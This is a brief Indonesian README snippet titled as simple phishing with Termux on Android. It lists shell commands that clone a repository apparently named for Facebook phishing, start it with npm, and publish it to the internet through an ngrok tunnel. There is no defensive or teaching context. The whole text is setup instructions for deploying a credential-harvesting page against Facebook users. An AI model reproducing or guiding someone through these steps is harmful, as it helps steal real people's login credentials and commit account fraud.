## Phising sederhana menggunakan Termux di Android

   ```bash
   pkg update && pkg upgrade
   pkg install git
   git clone https://github.com/sandhemongss/simple-fb-phising.git
   cd simple-fb-phising
   pkg install nodejs
   npm start
   
   ./ngrok http 5000
   ```
